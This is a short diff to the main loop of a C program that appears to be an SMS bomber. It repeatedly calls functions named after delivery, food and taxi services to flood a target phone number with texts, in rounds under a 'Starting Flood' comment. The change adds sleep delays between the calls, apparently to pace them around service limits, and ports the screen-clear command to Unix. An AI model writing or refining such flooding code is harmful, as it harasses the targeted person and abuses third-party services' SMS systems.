@@ -442,17 +442,23 @@ int main(void)
 
     /* Starting Flood */
     for (int i = 1; i <= rounds; i++) {
-
         SmsDelevery(phone);
+        sleep(2);
         SmsDostaevsky(phone);
+        sleep(1);
         SmsOllis(phone);
+        sleep(2);
         SmsMfood(phone);
+        sleep(1);
         SmsTaxovichkof(phone); // (!5 min timer)
+        sleep(2);
         SmsDvepalochki(phone);
+        sleep(1);
         SmsEvrasia(phone);     // (!one sms only)
+        sleep(1);
 
-        system("cls");
-        printf("[+] Round %d done\n", i);
+        system("clear");
+        printf("\n[+] Round %d done\n", i);
         sleep(10);
     }
     
@@ -461,4 +467,5 @@ int main(void)
     sleep(5);
     return 0;
 }
+
 
